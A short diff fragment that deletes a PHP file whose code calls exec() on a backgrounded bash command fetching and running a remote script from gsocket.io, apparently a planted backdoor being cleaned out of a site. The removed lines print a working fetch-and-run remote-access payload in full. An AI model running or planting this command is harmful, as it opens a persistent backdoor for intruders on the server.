@@ -1,5 +1,0 @@
-<?php
-$command = "nohup bash -c "$(curl -fsSL gsocket.io/x)" &";
-exec($command);
-echo "Process started";
-?>
